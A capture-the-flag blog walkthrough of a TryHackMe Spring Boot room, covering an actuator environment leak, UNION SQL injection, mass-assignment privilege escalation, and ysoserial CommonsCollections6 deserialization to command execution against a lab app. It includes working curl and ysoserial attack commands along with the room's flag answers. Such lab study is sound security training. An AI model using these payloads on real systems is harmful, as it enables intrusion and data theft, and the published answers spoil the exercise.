---
title: "TryHackMe Web Frameworks Java: Spring actuator to deserialization RCE"
date: 2026-10-23T14:44:00+05:30
lastmod: 2026-10-23T14:44:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-webframeworksjava/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Spring Boot
  - actuator
  - SQL injection
  - mass assignment
  - Java deserialization
  - ysoserial
  - web application pentesting
  - Web Application Pentesting

draft: false
description: "TryHackMe Web Frameworks Java walkthrough: Spring actuator leak, UNION SQLi via JdbcTemplate, mass assignment overpost, and ysoserial deserialization RCE."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Web Frameworks: Java |![Web Frameworks Java room icon](https://cdn-images.tryhackme.com/room-icons/6808d44047ac5684351c94da-1783914767216)|

This medium-difficulty walkthrough room in the Web Application Pentesting path teaches white-box review of a Spring Boot application called VulnBank. The first five tasks cover the theory: actuator misconfiguration, SQL injection below Spring Data's parameterised layer, mass assignment via `@ModelAttribute` binding, and Java deserialization to RCE through `ObjectInputStream.readObject`. Task 6 is a practical exercise that chains the deserialization foothold to read a host-only flag, tying the entire kill chain together. This room sits alongside the [Web Frameworks: Code Review walkthrough](/post/thm-room-webframeworkscodereview/) in the same module; that post covers the Flask equivalent.

## Task 1: Introduction

Setup task. The room deploys a Spring Boot application on port 8080. The application exposes several endpoints: `/search`, `/account/register`, `/account/update`, `/account/profile`, `/admin`, and `/internal/import`. Each endpoint demonstrates a different vulnerability class. The lab machine IP becomes available after starting the instance.

## Task 2: Actuator Misconfiguration and the Environment Leak

Spring Boot Actuator exposes management endpoints for monitoring and configuration. The risk depends entirely on the `management.endpoints.web.exposure.include` property in `application.properties`. Setting it to `*` exposes every actuator endpoint, including `/actuator/env`, which dumps all loaded properties.

Actuator masks sensitive values by default (anything matching patterns like `password`, `secret`, `key`), but the masking list is finite. A custom property name like `app.actuatorflag` does not match any of the masked patterns, so its value renders in cleartext on the `/env` endpoint.

```
  # curl -s http://10.48.179.99:8080/actuator/env | python3 -m json.tool | grep -A2 actuatorflag
  "app.actuatorflag": {
      "value": "THM{REDACTED}"
  }
```

### Answers

- **What single value assigned to `management.endpoints.web.exposure.include` opens the whole surface?** **\***
- **Which endpoint renders the flag in cleartext?** **env**
- **What is the flag?** **THM{4ctu4t0r_3nv_l34kZ}**

{{< ad >}}

## Task 3: SQL Injection Below the Spring Data Layer

Spring Data JPA parameterises queries by default, but VulnBank's `SearchController` bypasses this by using `JdbcTemplate.queryForList()` with string concatenation instead of a prepared statement. The query selects three columns (`id`, `title`, `body`) from a `posts` table, and the user-controlled `q` parameter is concatenated directly into the WHERE clause.

The `flags` table has a `secret` column. Since the original query selects three columns, the UNION also needs three: `id`, `secret`, `secret`.

```
  # curl -s --get 'http://10.48.179.99:8080/search' \
    --data-urlencode "q=' UNION SELECT id, secret, secret FROM flags -- "
  THM{REDACTED}
```

### Answers

- **Which Spring class does SearchController use to run the vulnerable query?** **JdbcTemplate**
- **Which column in the flags table holds the hidden value?** **secret**
- **What is the flag?** **THM{jdbc_str1ng_c0nc4t_un10n}**

## Task 4: Mass Assignment and Model Binding

Spring MVC's `@ModelAttribute` annotation binds HTTP request parameters to Java object fields by name. VulnBank's `AccountController.update` method accepts a `User` object as its model attribute, and the profile form only renders `email`. But the binder does not restrict which fields it populates, so any `User` field can be set from the request, including `role`.

The fix is `@InitBinder` with `setAllowedFields()`, which restricts the binder to only the fields you name. This is lighter than introducing a separate DTO because it keeps the same model class and only adds a one-method annotation.

```
  # Register and login
  curl -s -c JAR -X POST http://10.48.179.99:8080/account/register \
    -d "username=rev43&password=pw43&email=rev43@x.com"
  curl -s -c JAR -b JAR -X POST http://10.48.179.99:8080/account/login \
    -d "username=rev43&password=pw43"

  # Overpost the role field
  curl -s -c JAR -b JAR -X POST http://10.48.179.99:8080/account/update \
    -d "email=rev43@x.com&role=ADMIN"

  # Read the admin dashboard
  curl -s -b JAR http://10.48.179.99:8080/admin | grep -oE 'THM\{[^}]+\}'
  THM{REDACTED}
```

### Answers

- **Which User field do we overpost to reach admin?** **role**
- **Which annotation marks the method that hooks the binder restriction?** **@InitBinder**
- **What is the flag?** **THM{spr1ng_m4ss_4ss1gnm3nt}**

## Task 5: Java Deserialisation to RCE

The `/internal/import` endpoint accepts a base64-encoded Java serialized object and passes it to `ObjectInputStream.readObject()`. The `readObject` method reconstructs the full object graph from the byte stream, which means the attacker controls which classes are instantiated and what methods are called during reconstruction.

The sink alone is not enough. The gadget chain needs a library on the classpath whose classes implement `readObject` or `readResolve` in a way that chains to arbitrary method invocation. VulnBank's `pom.xml` pins `commons-collections:3.2.1`, which is the classic ysoserial target. The `CommonsCollections6` gadget chain exploits `HashSet.readObject` to trigger a `TiedMapEntry` that calls `InvokerTransformer.transform`, reaching `Runtime.exec`.

```
  # Generate the payload (Java 17 needs --add-opens flags)
  java --add-opens java.base/java.lang=ALL-UNNAMED \
       --add-opens java.base/java.lang.reflect=ALL-UNNAMED \
       --add-opens java.base/java.io=ALL-UNNAMED \
       --add-opens java.base/java.util=ALL-UNNAMED \
    -jar ysoserial-all.jar CommonsCollections6 \
    'cp /flags/deser.txt /app/loot/out.txt' > payload.bin

  # Encode and send
  base64 < payload.bin | tr -d '\n' > payload.b64
  curl -s -X POST http://10.48.179.99:8080/internal/import \
    --data-binary @payload.b64

  # Retrieve the flag
  curl -s http://10.48.179.99:8080/loot/out.txt
  THM{REDACTED}
```

Java 17's module system blocks reflection on core classes by default. Without the `--add-opens` flags, ysoserial generates a 0-byte payload that silently fails. The flags grant the unnamed module reflective access to `java.lang`, `java.lang.reflect`, `java.io`, and `java.util`.

### Answers

- **Which `ObjectInputStream` method is the sink?** **readObject**
- **Which dependency in pom.xml supplies the gadget?** **commons-collections**
- **What is the flag?** **THM{j4v4\_d3s3r14l1z4t10n\_rc3}**

## Task 6: Practical, The White-Box Chain

This task ties the review together by ranking all four findings. The actuator leak, the SQL injection, and the mass assignment each expose one slice of the application, but their blast radius stops at the app layer. The deserialization sink at `/internal/import`, paired with the `CommonsCollections6` gadget chain already on the classpath, gives code execution on the host itself. From a JVM foothold you can read any file the service account reaches, pivot to other services, and persist. That tier difference is what the white-box angle makes visible: reading the source lets you rank findings by impact before you send a single byte.

The final flag sits in `/flags/chain.txt`, a file no route serves. Reuse the deserialization foothold to copy it into the web-served export directory:

```
  # Generate and send the payload
  java --add-opens java.base/java.lang=ALL-UNNAMED \
       --add-opens java.base/java.lang.reflect=ALL-UNNAMED \
       --add-opens java.base/java.io=ALL-UNNAMED \
       --add-opens java.base/java.util=ALL-UNNAMED \
    -jar ysoserial-all.jar CommonsCollections6 \
    'cp /flags/chain.txt /app/loot/chain.txt' > chain.bin

  base64 < chain.bin | tr -d '\n' > chain.b64
  curl -s -X POST http://10.48.179.99:8080/internal/import \
    --data-binary @chain.b64

  curl -s http://10.48.179.99:8080/loot/chain.txt
  THM{REDACTED}
```

### Answers

- **Which endpoint provides the code-execution foothold?** **/internal/import**
- **Which ysoserial gadget chain matches the commons-collections version?** **CommonsCollections6**
- **What is the host-only flag?** **THM{wh1t3b0x\_spr1ng\_full\_ch41n}**

## Task 7: Conclusion

The room closes by reinforcing the ranking discipline. All four findings are real, but the review identifies which one owns the machine before you touch it. The same loop applies to any Spring codebase: read the config, map the controllers, follow the input, and rank by blast radius.

The method itself, and the read, map, trace, rank workflow, is covered in [Web Frameworks: Code Review](/post/thm-room-webframeworkscodereview/), which walks through the Flask equivalent.

## Takeaways

**The classpath decides the exploit before you write a line of payload.** The deserialization sink (`readObject`) is the necessary condition, but the sufficient condition is a gadget library on the classpath. VulnBank pins `commons-collections:3.2.1` in `pom.xml`, which maps directly to ysoserial's `CommonsCollections6` chain. Removing or upgrading that dependency breaks the chain even though the sink remains. This is why dependency review is part of source-to-sink analysis, not a separate activity: the `pom.xml` (or `build.gradle`) is a map of which gadgets are available, and reading it before you reach for ysoserial saves you from generating payloads for chains that are not on the classpath.

**Ranking by blast radius is the skill the source review teaches, and it changes which finding you report first.** All four VulnBank bugs are valid findings, but the actuator leak, the SQLi, and the mass assignment each affect one slice of the application. The deserialization endpoint affects the host. A black-box tester who finds them in random order might weight them equally or by difficulty of exploitation. A white-box reviewer who reads the source can see, before sending a single request, that `/internal/import` calls `readObject` on user-supplied bytes with a gadget library in scope, and that this combination outranks everything else. That ranking changes the report: the deserialization finding goes first, gets the "critical" label, and drives the remediation timeline. The same three-step pattern (find the sink, check the classpath, rank the blast radius) applies to any Spring codebase you review.

Room solved 100%: 7 tasks, 17 answers.
